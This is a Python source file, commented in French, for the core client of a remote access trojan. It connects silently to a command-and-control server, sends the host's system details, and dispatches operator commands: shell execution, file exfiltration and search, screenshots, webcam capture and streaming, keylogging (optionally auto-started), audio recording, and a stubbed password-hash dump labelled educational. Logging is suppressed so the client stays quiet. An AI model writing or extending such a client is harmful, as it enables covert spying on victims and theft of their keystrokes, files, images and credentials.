"""
RAT Client Core - Client principal
Inspiré de l'architecture des RATs modernes avec communication bidirectionnelle
"""

import socket
import ssl
import threading
import time
import json
import logging
from typing import Optional, Dict, Any

from client.core.communication import CommunicationManager
from client.modules.system_info import SystemInfoModule
from client.modules.shell_executor import ShellExecutor
from client.modules.file_operations import FileOperations
from client.modules.screenshot import ScreenshotModule
from client.modules.keylogger import KeyloggerModule
from client.modules.webcam import WebcamModule
from client.modules.audio_recorder import AudioRecorderModule
from client.utils.config import ClientConfig
from client.utils.crypto import CryptoManager
from shared.protocol import Protocol, MessageType
from shared.exceptions import RATException

# Configuration du logging
logging.basicConfig(level=logging.CRITICAL)  # Mode silencieux par défaut
logger = logging.getLogger(__name__)

class RATClient:
    """Client RAT principal avec architecture modulaire"""
    
    def __init__(self, config: ClientConfig):
        self.config = config
        self.running = False
        self.connected = False
        
        # Gestionnaires
        self.comm_manager = CommunicationManager(config)
        self.crypto_manager = CryptoManager(config) if config.USE_SSL else None
        
        # Modules fonctionnels
        self.system_info = SystemInfoModule()
        self.shell_executor = ShellExecutor()
        self.file_ops = FileOperations()
        self.screenshot = ScreenshotModule()
        self.keylogger = KeyloggerModule()
        self.webcam = WebcamModule()
        self.audio_recorder = AudioRecorderModule()
        
        # État du client
        self.session_id = None
        self.last_heartbeat = 0
        self.command_handlers = self._setup_command_handlers()
        
        if config.DEBUG:
            logger.setLevel(logging.DEBUG)
            logger.debug("RATClient initialisé")
    
    def _setup_command_handlers(self) -> Dict[str, callable]:
        """Configure les gestionnaires de commandes"""
        return {
            'shell': self._handle_shell_command,
            'ipconfig': self._handle_ipconfig_command,
            'sysinfo': self._handle_sysinfo_command,
            'download': self._handle_download_command,
            'upload': self._handle_upload_command,
            'screenshot': self._handle_screenshot_command,
            'search': self._handle_search_command,
            'webcam_snapshot': self._handle_webcam_snapshot_command,
            'webcam_stream': self._handle_webcam_stream_command,
            'keylogger': self._handle_keylogger_command,
            'record_audio': self._handle_record_audio_command,
            'hashdump': self._handle_hashdump_command,
            'ping': self._handle_ping_command,
            'disconnect': self._handle_disconnect_command
        }
    
    def connect(self):
        """Se connecte au serveur C2"""
        try:
            if self.config.DEBUG:
                logger.info(f"Connexion à {self.config.SERVER_HOST}:{self.config.SERVER_PORT}")
            
            # Établissement de la connexion
            if not self.comm_manager.connect():
                raise RATException("Impossible d'établir la connexion")
            
            self.connected = True
            self.running = True
            
            # Handshake initial
            if not self._perform_handshake():
                raise RATException("Échec du handshake")
            
            # Démarrage des threads
            self._start_threads()
            
            # Boucle principale de réception
            self._main_loop()
            
        except Exception as e:
            if self.config.DEBUG:
                logger.error(f"Erreur de connexion: {e}")
            raise
        finally:
            self.disconnect()
    
    def _perform_handshake(self) -> bool:
        """Effectue le handshake initial avec le serveur"""
        try:
            # Envoi des informations système
            system_data = self.system_info.get_system_info()
            
            handshake_message = Protocol.create_message(
                MessageType.SYSTEM_INFO,
                system_data
            )
            
            if not self.comm_manager.send_message(handshake_message):
                return False
            
            # Attente de la confirmation
            response = self.comm_manager.receive_message(timeout=10)
            
            if response and response.get('type') == MessageType.HANDSHAKE_OK:
                self.session_id = response.get('data', {}).get('session_id')
                if self.config.DEBUG:
                    logger.info(f"Handshake réussi, session: {self.session_id}")
                return True
            
        except Exception as e:
            if self.config.DEBUG:
                logger.error(f"Erreur de handshake: {e}")
        
        return False
    
    def _start_threads(self):
        """Démarre les threads auxiliaires"""
        # Thread de heartbeat
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        
        # Thread de keylogger si demandé
        if hasattr(self.config, 'AUTO_START_KEYLOGGER') and self.config.AUTO_START_KEYLOGGER:
            keylogger_thread = threading.Thread(target=self.keylogger.start_background)
            keylogger_thread.daemon = True
            keylogger_thread.start()
    
    def _heartbeat_loop(self):
        """Boucle de heartbeat pour maintenir la connexion"""
        while self.running and self.connected:
            try:
                current_time = time.time()
                
                if current_time - self.last_heartbeat >= self.config.HEARTBEAT_INTERVAL:
                    heartbeat_msg = Protocol.create_message(
                        MessageType.HEARTBEAT,
                        {'timestamp': current_time, 'session_id': self.session_id}
                    )
                    
                    if self.comm_manager.send_message(heartbeat_msg):
                        self.last_heartbeat = current_time
                    else:
                        if self.config.DEBUG:
                            logger.warning("Échec d'envoi du heartbeat")
                        break
                
                time.sleep(1)
                
            except Exception as e:
                if self.config.DEBUG:
                    logger.error(f"Erreur dans heartbeat: {e}")
                break
    
    def _main_loop(self):
        """Boucle principale de réception des commandes"""
        while self.running and self.connected:
            try:
                # Réception d'un message
                message = self.comm_manager.receive_message(timeout=5)
                
                if not message:
                    continue
                
                # Traitement du message
                self._process_message(message)
                
            except socket.timeout:
                continue
            except ConnectionResetError:
                if self.config.DEBUG:
                    logger.info("Connexion fermée par le serveur")
                break
            except Exception as e:
                if self.config.DEBUG:
                    logger.error(f"Erreur dans la boucle principale: {e}")
                break
    
    def _process_message(self, message: Dict[str, Any]):
        """Traite un message reçu du serveur"""
        try:
            msg_type = message.get('type')
            data = message.get('data', {})
            
            if msg_type == MessageType.COMMAND:
                self._handle_command(data)
            elif msg_type == MessageType.BROADCAST:
                self._handle_broadcast(data)
            elif msg_type == MessageType.CONFIG_UPDATE:
                self._handle_config_update(data)
            elif msg_type == MessageType.DISCONNECT:
                self.running = False
            else:
                if self.config.DEBUG:
                    logger.warning(f"Type de message non géré: {msg_type}")
                    
        except Exception as e:
            if self.config.DEBUG:
                logger.error(f"Erreur lors du traitement du message: {e}")
    
    def _handle_command(self, data: Dict[str, Any]):
        """Traite une commande reçue du serveur"""
        command = data.get('command', '')
        args = data.get('args', '')
        
        if self.config.DEBUG:
            logger.debug(f"Commande reçue: {command} {args}")
        
        try:
            if command in self.command_handlers:
                result = self.command_handlers[command](args)
            else:
                result = {
                    'status': 'error',
                    'output': f'Commande inconnue: {command}'
                }
            
            # Envoi de la réponse
            response = Protocol.create_message(
                MessageType.COMMAND_RESPONSE,
                result
            )
            
            self.comm_manager.send_message(response)
            
        except Exception as e:
            # Envoi de l'erreur
            error_response = Protocol.create_message(
                MessageType.COMMAND_RESPONSE,
                {
                    'status': 'error',
                    'output': f'Erreur lors de l\'exécution: {str(e)}'
                }
            )
            
            self.comm_manager.send_message(error_response)
    
    def _handle_broadcast(self, data: Dict[str, Any]):
        """Traite un message de diffusion"""
        message = data.get('message', '')
        if self.config.DEBUG:
            logger.info(f"Broadcast reçu: {message}")
    
    def _handle_config_update(self, data: Dict[str, Any]):
        """Traite une mise à jour de configuration"""
        try:
            for key, value in data.items():
                if hasattr(self.config, key.upper()):
                    setattr(self.config, key.upper(), value)
                    if self.config.DEBUG:
                        logger.info(f"Configuration mise à jour: {key} = {value}")
        except Exception as e:
            if self.config.DEBUG:
                logger.error(f"Erreur mise à jour config: {e}")
    
    # === GESTIONNAIRES DE COMMANDES ===
    
    def _handle_shell_command(self, args: str) -> Dict[str, Any]:
        """Exécute une commande shell"""
        return self.shell_executor.execute_command(args)
    
    def _handle_ipconfig_command(self, args: str) -> Dict[str, Any]:
        """Récupère la configuration réseau"""
        return self.system_info.get_network_config()
    
    def _handle_sysinfo_command(self, args: str) -> Dict[str, Any]:
        """Récupère les informations système complètes"""
        return {
            'status': 'success',
            'output': json.dumps(self.system_info.get_detailed_info(), indent=2)
        }
    
    def _handle_download_command(self, args: str) -> Dict[str, Any]:
        """Télécharge un fichier vers le serveur"""
        return self.file_ops.download_file(args)
    
    def _handle_upload_command(self, args: str) -> Dict[str, Any]:
        """Reçoit un fichier du serveur"""
        # Cette fonction nécessite une implémentation plus complexe
        # avec réception des données de fichier
        return {
            'status': 'info',
            'output': 'Fonction upload à implémenter avec le protocole de transfert'
        }
    
    def _handle_screenshot_command(self, args: str) -> Dict[str, Any]:
        """Prend une capture d'écran"""
        return self.screenshot.take_screenshot()
    
    def _handle_search_command(self, args: str) -> Dict[str, Any]:
        """Recherche un fichier"""
        return self.file_ops.search_file(args)
    
    def _handle_webcam_snapshot_command(self, args: str) -> Dict[str, Any]:
        """Prend une photo avec la webcam"""
        return self.webcam.take_snapshot()
    
    def _handle_webcam_stream_command(self, args: str) -> Dict[str, Any]:
        """Contrôle le stream webcam"""
        if args == 'start':
            return self.webcam.start_stream()
        elif args == 'stop':
            return self.webcam.stop_stream()
        else:
            return {'status': 'error', 'output': 'Usage: webcam_stream <start|stop>'}
    
    def _handle_keylogger_command(self, args: str) -> Dict[str, Any]:
        """Contrôle le keylogger"""
        if args == 'start':
            return self.keylogger.start()
        elif args == 'stop':
            return self.keylogger.stop()
        elif args == 'dump':
            return self.keylogger.get_logs()
        else:
            return {'status': 'error', 'output': 'Usage: keylogger <start|stop|dump>'}
    
    def _handle_record_audio_command(self, args: str) -> Dict[str, Any]:
        """Enregistre l'audio"""
        try:
            duration = int(args) if args.isdigit() else 10
            return self.audio_recorder.record_audio(duration)
        except ValueError:
            return {'status': 'error', 'output': 'Durée invalide'}
    
    def _handle_hashdump_command(self, args: str) -> Dict[str, Any]:
        """Extraction des hashes système (fonction éducative)"""
        return {
            'status': 'warning',
            'output': (
                '⚠️  FONCTION HASHDUMP - ÉDUCATIVE UNIQUEMENT ⚠️\\n'
                'Cette fonction simule l\'extraction de hashes système.\\n'
                'En pratique, cela nécessiterait des privilèges administrateur\\n'
                'et l\'accès aux fichiers SAM (Windows) ou shadow (Linux).\\n'
                'Implémentation laissée comme exercice éducatif.'
            )
        }
    
    def _handle_ping_command(self, args: str) -> Dict[str, Any]:
        """Répond à un ping"""
        return {
            'status': 'success',
            'output': f'Pong! Timestamp: {time.time()}'
        }
    
    def _handle_disconnect_command(self, args: str) -> Dict[str, Any]:
        """Déconnecte le client"""
        self.running = False
        return {
            'status': 'success',
            'output': 'Déconnexion en cours...'
        }
    
    def disconnect(self):
        """Déconnecte le client proprement"""
        if self.config.DEBUG:
            logger.info("Déconnexion du client")
        
        self.running = False
        self.connected = False
        
        # Arrêt des modules
        try:
            self.keylogger.stop()
            self.webcam.stop_stream()
            self.audio_recorder.stop_recording()
        except:
            pass
        
        # Fermeture de la communication
        self.comm_manager.disconnect()